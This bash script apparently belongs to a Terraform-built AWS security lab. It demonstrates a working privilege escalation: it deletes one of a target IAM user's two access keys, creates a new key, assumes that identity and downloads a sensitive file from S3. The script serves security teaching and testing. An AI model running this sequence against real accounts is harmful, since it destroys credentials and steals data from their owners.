#!/bin/bash

# Demo script for iam:DeleteAccessKey + iam:CreateAccessKey to S3 bucket access
# This scenario demonstrates how a user can bypass the AWS 2-key limit by deleting an existing
# access key and creating a new one for a user with S3 bucket access

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-dakcak-to-bucket-starting-user"
TARGET_USER="pl-prod-dakcak-to-bucket-target-user"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM DeleteAccessKey + CreateAccessKey Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${BLUE}This scenario demonstrates bypassing AWS's 2-key limit${NC}"
echo -e "${BLUE}by deleting an existing access key and creating a new one${NC}\n"

# Step 1: Retrieve credentials from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_iam_deleteaccesskey_createaccesskey.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Discover target bucket
echo -e "${YELLOW}Step 4: Discovering target bucket${NC}"
TARGET_BUCKET="pl-sensitive-data-dakcak-${ACCOUNT_ID}"
echo "Target bucket pattern: ${TARGET_BUCKET}-*"
echo -e "${GREEN}✓ Identified target bucket${NC}\n"

# Step 5: Verify we don't have bucket access yet
echo -e "${YELLOW}Step 5: Verifying we don't have bucket access yet${NC}"
echo "Attempting to list S3 buckets..."
if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
    echo -e "${GREEN}✓ Confirmed: Cannot list S3 buckets (as expected)${NC}"
else
    echo -e "${YELLOW}Warning: May already have some S3 permissions${NC}"
fi
echo ""

# Step 6: List existing access keys for target user
echo -e "${YELLOW}Step 6: Listing existing access keys for target user${NC}"
echo "Target user: $TARGET_USER"
echo ""

ACCESS_KEYS_JSON=$(aws iam list-access-keys --user-name $TARGET_USER --output json)
ACCESS_KEYS=$(echo "$ACCESS_KEYS_JSON" | jq -r '.AccessKeyMetadata[].AccessKeyId')
KEY_COUNT=$(echo "$ACCESS_KEYS" | wc -l | xargs)

echo "Found $KEY_COUNT access keys for $TARGET_USER:"
echo "$ACCESS_KEYS_JSON" | jq -r '.AccessKeyMetadata[] | "  - Key ID: \(.AccessKeyId) (Status: \(.Status), Created: \(.CreateDate))"'
echo ""

if [ "$KEY_COUNT" -lt 2 ]; then
    echo -e "${RED}Error: Expected 2 access keys but found $KEY_COUNT${NC}"
    echo "This scenario requires the target user to be at the AWS 2-key limit"
    exit 1
fi

echo -e "${GREEN}✓ Confirmed: Target user is at AWS 2-key limit${NC}"
echo -e "${BLUE}Cannot create a new key without deleting an existing one first${NC}\n"

# Step 7: Delete one of the existing access keys
echo -e "${YELLOW}Step 7: Deleting one of the existing access keys${NC}"
# Get the first key to delete
KEY_TO_DELETE=$(echo "$ACCESS_KEYS" | head -n 1)
echo "Deleting access key: $KEY_TO_DELETE"

# Save it to a temporary file for cleanup script to know which was deleted
echo "$KEY_TO_DELETE" > /tmp/dakcak-deleted-key-id-${ACCOUNT_ID}.txt

aws iam delete-access-key \
    --user-name $TARGET_USER \
    --access-key-id $KEY_TO_DELETE

echo -e "${GREEN}✓ Successfully deleted access key${NC}"
echo -e "${BLUE}This opens up a slot for creating a new key${NC}\n"

# Step 8: Create new access key for target user
echo -e "${YELLOW}Step 8: Creating new access key for target user${NC}"
echo "This is the privilege escalation vector..."
echo ""

NEW_ACCESS_KEY_JSON=$(aws iam create-access-key \
    --user-name $TARGET_USER \
    --output json)

NEW_ACCESS_KEY_ID=$(echo "$NEW_ACCESS_KEY_JSON" | jq -r '.AccessKey.AccessKeyId')
NEW_SECRET_ACCESS_KEY=$(echo "$NEW_ACCESS_KEY_JSON" | jq -r '.AccessKey.SecretAccessKey')

echo "Created new access key: $NEW_ACCESS_KEY_ID"
echo -e "${GREEN}✓ Successfully created access key for target user${NC}\n"

# Save the new key ID for cleanup
echo "$NEW_ACCESS_KEY_ID" > /tmp/dakcak-created-key-id-${ACCOUNT_ID}.txt

# Wait for keys to initialize
echo -e "${YELLOW}Waiting 15 seconds for access keys to initialize...${NC}"
sleep 15
echo -e "${GREEN}✓ Keys initialized${NC}\n"

# Step 9: Switch to target user credentials
echo -e "${YELLOW}Step 9: Switching to target user credentials${NC}"
unset AWS_SESSION_TOKEN
export AWS_ACCESS_KEY_ID=$NEW_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_ACCESS_KEY

TARGET_USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $TARGET_USER_IDENTITY"
echo -e "${GREEN}✓ Now using target user credentials${NC}\n"

# Step 10: List buckets to find the exact bucket name
echo -e "${YELLOW}Step 10: Finding the target bucket${NC}"
FULL_BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-sensitive-data-dakcak-')].Name" --output text)

if [ -z "$FULL_BUCKET_NAME" ]; then
    echo -e "${RED}Error: Could not find target bucket${NC}"
    exit 1
fi

echo "Target bucket: $FULL_BUCKET_NAME"
echo -e "${GREEN}✓ Found target bucket${NC}\n"

# Step 11: Verify S3 bucket access
echo -e "${YELLOW}Step 11: Verifying S3 bucket access${NC}"
echo "Attempting to list bucket contents..."

if aws s3 ls s3://$FULL_BUCKET_NAME; then
    echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}"
fi
echo ""

echo "Reading sensitive data file..."
DOWNLOAD_FILE="/tmp/dakcak-bucket-sensitive-data-${ACCOUNT_ID}.txt"
if aws s3 cp s3://$FULL_BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE; then
    echo -e "\n${GREEN}✓ Successfully downloaded sensitive data!${NC}"
    echo -e "${YELLOW}Contents of sensitive file:${NC}"
    cat $DOWNLOAD_FILE
    echo ""
    echo -e "${GREEN}✓ BUCKET ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to access bucket${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER"
echo "2. Listed access keys for: $TARGET_USER (found 2 keys at AWS limit)"
echo "3. Deleted existing key: $KEY_TO_DELETE"
echo "4. Created new access key: $NEW_ACCESS_KEY_ID"
echo "5. Switched to target user credentials"
echo "6. Gained access to S3 bucket: $FULL_BUCKET_NAME"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Deleted access key: $KEY_TO_DELETE"
echo "- Created access key: $NEW_ACCESS_KEY_ID"
echo "- Downloaded file: $DOWNLOAD_FILE"

echo -e "\n${BLUE}Key Insight:${NC}"
echo "This attack bypasses AWS's 2-key limit by deleting an existing key"
echo "before creating a new one. The target user may not notice immediately"
echo "if the deleted key was inactive or a backup key."

echo -e "\n${RED}⚠ Warning: The original access key has been deleted and cannot be restored${NC}"
echo -e "${YELLOW}To clean up and restore the environment:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
